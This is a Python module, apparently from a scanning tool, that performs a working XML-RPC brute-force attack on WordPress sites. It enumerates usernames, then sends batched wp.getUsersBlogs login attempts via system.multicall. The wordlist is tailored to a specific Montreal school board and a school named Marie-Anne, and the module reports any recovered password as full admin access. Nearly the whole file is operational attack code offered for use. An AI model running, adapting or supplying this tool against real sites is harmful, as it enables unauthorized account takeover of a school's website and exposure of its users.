import requests
import re
import os
from colorama import Fore, Style

# External wordlist path — set by omniscan.py via argument
EXTERNAL_WORDLIST = None

# Base wordlist — 500+ common weak passwords + FR context + school context
BASE_PASSWORDS = [
    # Top 100 most common passwords globally
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
    "fuckyou", "121212", "000000", "qazwsx", "123qwe",
    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
    "asdfgh", "hunter", "buster", "soccer", "harley",
    "batman", "andrew", "tigger", "sunshine", "iloveyou",
    "fuckme", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "asshole", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass",
    "fuck", "maggie", "159753", "aaaaaa", "ginger",
    "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321",
    "dallas", "austin", "thunder", "taylor", "matrix",
    # Admin / IT patterns
    "admin", "admin123", "admin1234", "admin!", "administrator",
    "root", "toor", "root123", "password1", "password123",
    "pass123", "pass1234", "changeme", "default", "guest",
    "test", "test123", "test1234", "user", "user123",
    "login", "welcome", "welcome1", "welcome123",
    "P@ssw0rd", "P@ssword1", "P@ssword123", "Passw0rd!",
    "Admin123!", "Welcome1!", "Qwerty123!", "Temp1234!",
    "Change.me", "ChangeMe1", "ChangeMe!", "Letmein1!",
    "Password1!", "Tr0ub4dor&3", "Monkey123!", "Dragon1!",
    # French common passwords
    "motdepasse", "azerty", "azertyuiop", "bonjour", "soleil",
    "marseille", "chocolat", "coucou", "doudou", "loulou",
    "nicolas", "camille", "pierre", "thomas", "julien",
    "alexandre", "maxime", "antoine", "mathieu", "sebastien",
    "isabelle", "nathalie", "stephane", "philippe", "patrick",
    "aurelie", "caroline", "francois", "dominique", "sylvie",
    "chouchou", "bibiche", "amour", "maman", "papa",
    "france", "paris", "lyon", "toulouse", "bordeaux",
    "motdepasse1", "azerty123", "bonjour1", "soleil1",
    "poulet", "lapin", "cheval", "papillon",
    # Québec / FR-CA
    "montreal", "quebec", "ottawa", "toronto", "canada",
    "hockey1", "canadiens", "habs", "gohabsgo",
    "tabarnak", "calisse", "ostie", "crisse",
    "poutine", "sirop", "cabane", "outaouais",
    # School / education context (CSDM = Commission Scolaire De Montréal)
    "ecole", "ecole123", "ecole2024", "ecole2025", "ecole2026",
    "csdm", "csdm123", "csdm2020", "csdm2021", "csdm2022",
    "csdm2023", "csdm2024", "csdm2025", "csdm2026",
    "Csdm2024!", "Csdm2025!", "Csdm2026!", "CSDM2025",
    "marieanne", "marie-anne", "marie", "anne",
    "marieanne1", "marieanne123", "MarieAnne", "MarieAnne!",
    "MarieAnne123", "MarieAnne2025!", "MarieAnne2026!",
    "gouvernance", "serveur", "wordpress", "wp",
    "school", "education", "etudiant", "professeur", "prof",
    "eleve", "classe", "cours", "enseignant",
    "bienvenue", "Bienvenue1!", "bienvenue123",
    "temp", "temp123", "Temp2025!", "Temp2026!",
    "temporaire", "provisoire",
    # Elementor / WordPress
    "wordpress1", "wordpress123", "wp-admin", "wpadmin",
    "elementor", "elementor123",
    # Seasons + years (very common temp passwords in schools)
    "Hiver2020!", "Hiver2021!", "Hiver2022!", "Hiver2023!",
    "Hiver2024!", "Hiver2025!", "Hiver2026!",
    "Ete2020!", "Ete2021!", "Ete2022!", "Ete2023!",
    "Ete2024!", "Ete2025!", "Ete2026!",
    "Printemps2024!", "Printemps2025!", "Printemps2026!",
    "Automne2024!", "Automne2025!", "Automne2026!",
    "Winter2024!", "Winter2025!", "Winter2026!",
    "Summer2024!", "Summer2025!", "Summer2026!",
    "Spring2025!", "Fall2025!",
    "Janvier2025!", "Fevrier2025!", "Mars2025!", "Avril2025!",
    "Mai2025!", "Juin2025!", "Septembre2025!", "Octobre2025!",
    "Novembre2025!", "Decembre2025!",
    # Year-based patterns
    "2020", "2021", "2022", "2023", "2024", "2025", "2026",
    "pass2024", "pass2025", "pass2026",
    "mdp2024", "mdp2025", "mdp2026",
    # Number patterns
    "123abc", "abc1234", "aaa111", "qqq111",
    "a1b2c3", "1a2b3c", "aa1234", "zz1234",
    # Keyboard walks
    "qwerty123", "1qaz!QAZ", "zaq1@WSX", "!QAZ2wsx",
    "qwer1234", "asdf1234", "zxcv1234",
    # L33t speak
    "p@$$w0rd", "l3tm31n", "h@ck3r", "r00t",
]


def _generate_user_passwords(usernames):
    """Generate username-derived passwords — much more aggressive."""
    derived = []
    years = ["2020", "2021", "2022", "2023", "2024", "2025", "2026"]
    suffixes = ["", "1", "12", "123", "1234", "!", "!!", "@", "#",
                "@123", "#123", ".", "_", "01", "007"]
    
    for u in usernames:
        u_cap = u.capitalize()
        u_upper = u.upper()
        u_rev = u[::-1]
        
        # Basic username variations
        for s in suffixes:
            derived.append(f"{u}{s}")
            derived.append(f"{u_cap}{s}")
            derived.append(f"{u_upper}{s}")
        
        # Username + year combos
        for y in years:
            derived.append(f"{u}{y}")
            derived.append(f"{u_cap}{y}")
            derived.append(f"{u}{y}!")
            derived.append(f"{u_cap}{y}!")
            derived.append(f"{u}_{y}")
            derived.append(f"{u}@{y}")
        
        # Username + context
        derived.extend([
            f"{u}@csdm", f"{u}.csdm", f"{u}_csdm",
            f"{u}@ecole", f"{u}@school",
            f"{u}pass", f"{u}pwd", f"{u}mdp",
            f"mdp{u}", f"pass{u}", f"pwd{u}",
            u_rev, f"{u_rev}123",
        ])
        
        # Double username
        derived.append(f"{u}{u}")
        
        # First + last letter combos
        if len(u) >= 3:
            derived.append(f"{u[:3]}123")
            derived.append(f"{u[:3]}1234")
    
    return list(set(derived))


def _load_external_wordlist(filepath):
    """Load passwords from an external wordlist file."""
    passwords = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                pwd = line.strip()
                if pwd and len(pwd) <= 50:  # Skip absurdly long lines
                    passwords.append(pwd)
        return passwords
    except (IOError, OSError) as e:
        print(f"  [{Fore.RED}!{Style.RESET_ALL}] Failed to load wordlist '{filepath}': {e}")
        return []



def _build_multicall_payload(username, passwords):
    """Build a system.multicall XML payload with multiple wp.getUsersBlogs calls."""
    calls = ""
    for pwd in passwords:
        # Escape XML special chars
        pwd_escaped = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
        user_escaped = username.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        
        calls += f"""<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>{user_escaped}</string></value>
<value><string>{pwd_escaped}</string></value>
</data></array></value></member>
</struct></value>
"""
    
    return f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
{calls}
</data></array></value></param></params>
</methodCall>"""


def _parse_multicall_response(response_text, username, passwords):
    """Parse the multicall response to find successful logins."""
    # Each sub-call response is wrapped in <value> tags inside the outer array
    # A successful login returns blog info, a failed one returns a <fault>
    
    # Split by each sub-response
    # Successful response contains <string>isAdmin</string> or blog URL
    # Failed response contains <fault> with "Incorrect username or password"
    
    successes = []
    
    # Find all individual responses in order
    # Each response block is between array data value elements
    parts = re.findall(r'<value>\s*(<array>.*?</array>|<struct>.*?</struct>)\s*</value>', 
                       response_text, re.DOTALL)
    
    for i, part in enumerate(parts):
        if i >= len(passwords):
            break
        
        # A successful login contains blog info (isAdmin, blogid, url, blogName)
        if "isAdmin" in part or "blogid" in part or "blogName" in part:
            successes.append(passwords[i])
        # A faultCode means failure — this is expected for wrong passwords
        # We skip these silently
    
    return successes


def run_xmlrpc_bruteforce(target_url, endpoints=None, forms=None):
    """
    XML-RPC Brute-Force via system.multicall.
    Tests discovered usernames against a contextual wordlist.
    Each HTTP request carries a batch of password attempts.
    """
    print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Running XML-RPC Brute-Force Module...")
    results = []
    base_url = target_url.rstrip('/')
    xmlrpc_url = f"{base_url}/xmlrpc.php"
    
    # --- 1. Verify XML-RPC is active ---
    print(f"  [{Fore.BLUE}*{Style.RESET_ALL}] Verifying XML-RPC endpoint...")
    try:
        r = requests.get(xmlrpc_url, timeout=5)
        if r.status_code not in [200, 405] and "XML-RPC" not in r.text:
            # Try POST
            test_payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
            r = requests.post(xmlrpc_url, data=test_payload, timeout=5, headers={"Content-Type": "text/xml"})
            if "methodResponse" not in r.text:
                print(f"  [{Fore.YELLOW}!{Style.RESET_ALL}] XML-RPC not available. Skipping brute-force.")
                return results
    except requests.RequestException:
        print(f"  [{Fore.RED}!{Style.RESET_ALL}] Cannot reach XML-RPC endpoint.")
        return results
    
    print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] XML-RPC confirmed active.")

    # --- 2. Enumerate usernames if not already known ---
    print(f"  [{Fore.BLUE}*{Style.RESET_ALL}] Enumerating usernames for brute-force...")
    usernames = set()
    
    # REST API enumeration
    try:
        r = requests.get(f"{base_url}/wp-json/wp/v2/users", timeout=5)
        if r.status_code == 200:
            data = r.json()
            for u in data:
                if isinstance(u, dict) and u.get("slug"):
                    usernames.add(u["slug"])
    except (requests.RequestException, ValueError):
        pass
    
    # Author archive enumeration
    for i in range(1, 15):
        try:
            r = requests.get(f"{base_url}/?author={i}", timeout=3, allow_redirects=False)
            if r.status_code in [301, 302]:
                loc = r.headers.get("Location", "")
                match = re.search(r'/author/([^/]+)', loc)
                if match:
                    usernames.add(match.group(1))
        except requests.RequestException:
            continue
    
    # Always try admin
    usernames.add("admin")
    
    if not usernames:
        print(f"  [{Fore.YELLOW}!{Style.RESET_ALL}] No usernames found. Trying 'admin' only.")
        usernames = {"admin"}
    
    print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] Target usernames: {', '.join(usernames)}")
    
    # --- 3. Build password list ---
    all_passwords = list(set(BASE_PASSWORDS + _generate_user_passwords(list(usernames))))
    
    # Load external wordlist if provided
    if EXTERNAL_WORDLIST and os.path.isfile(EXTERNAL_WORDLIST):
        print(f"  [{Fore.BLUE}*{Style.RESET_ALL}] Loading external wordlist: {EXTERNAL_WORDLIST}")
        ext_passwords = _load_external_wordlist(EXTERNAL_WORDLIST)
        if ext_passwords:
            all_passwords = list(set(all_passwords + ext_passwords))
            print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] Loaded {len(ext_passwords)} passwords from external wordlist")
    
    print(f"  [{Fore.BLUE}*{Style.RESET_ALL}] Total wordlist: {len(all_passwords)} passwords to test per user")
    
    # --- 4. Brute-force each username via multicall ---
    BATCH_SIZE = 50  # passwords per request (safe for most WP installs)
    
    for username in usernames:
        print(f"  [{Fore.BLUE}*{Style.RESET_ALL}] Attacking user '{Fore.YELLOW}{username}{Style.RESET_ALL}'...")
        
        batches = [all_passwords[i:i+BATCH_SIZE] for i in range(0, len(all_passwords), BATCH_SIZE)]
        found_password = None
        
        for batch_idx, batch in enumerate(batches):
            print(f"    [{Fore.CYAN}-{Style.RESET_ALL}] Batch {batch_idx+1}/{len(batches)} ({len(batch)} passwords)...")
            
            payload = _build_multicall_payload(username, batch)
            
            try:
                r = requests.post(
                    xmlrpc_url, 
                    data=payload.encode('utf-8'),
                    timeout=30,
                    headers={"Content-Type": "text/xml; charset=utf-8"}
                )
                
                if "methodResponse" not in r.text:
                    print(f"    [{Fore.RED}!{Style.RESET_ALL}] Unexpected response, server may be blocking.")
                    # Check for rate limiting / WAF
                    if r.status_code in [403, 429]:
                        print(f"    [{Fore.RED}!{Style.RESET_ALL}] Detected rate limiting (HTTP {r.status_code}). Stopping.")
                        results.append({
                            "type": "bruteforce_blocked",
                            "desc": f"Brute-force blocked by WAF/rate-limiter for user '{username}' (HTTP {r.status_code})",
                            "severity": "Info"
                        })
                        break
                    continue
                
                # Parse response for successful logins
                successes = _parse_multicall_response(r.text, username, batch)
                
                if successes:
                    found_password = successes[0]
                    res = f"CREDENTIAL FOUND! {username}:{found_password} — Full admin access via XML-RPC"
                    print(f"  [{Fore.RED}{'!'*60}{Style.RESET_ALL}]")
                    print(f"  [{Fore.RED}!{Style.RESET_ALL}] {Fore.RED}{res}{Style.RESET_ALL}")
                    print(f"  [{Fore.RED}{'!'*60}{Style.RESET_ALL}]")
                    results.append({
                        "type": "credential_found",
                        "desc": res,
                        "severity": "Critical"
                    })
                    # Try to get more info about the account
                    results.append({
                        "type": "credential_detail",
                        "desc": f"Login: {username} | Password: {found_password} | "
                                f"Endpoint: {xmlrpc_url} | "
                                f"Access: wp-admin panel + XML-RPC API full control",
                        "severity": "Critical"
                    })
                    break  # Found password, stop for this user
                    
            except requests.Timeout:
                print(f"    [{Fore.YELLOW}!{Style.RESET_ALL}] Request timed out (server overloaded?)")
                continue
            except requests.RequestException as e:
                print(f"    [{Fore.RED}!{Style.RESET_ALL}] Request error: {e}")
                continue
        
        if not found_password:
            print(f"  [{Fore.YELLOW}!{Style.RESET_ALL}] No password found for '{username}' with current wordlist.")

    if not any(r["type"] == "credential_found" for r in results):
        print(f"  [{Fore.YELLOW}!{Style.RESET_ALL}] No credentials found. Consider expanding wordlist.")
        results.append({
            "type": "bruteforce_attempted",
            "desc": f"Brute-force attempted on {len(usernames)} users with {len(all_passwords)} passwords — no credentials found",
            "severity": "Info"
        })
    
    print(f"  [{Fore.GREEN}+{Style.RESET_ALL}] Brute-force module complete: {len(results)} findings.")
    return results
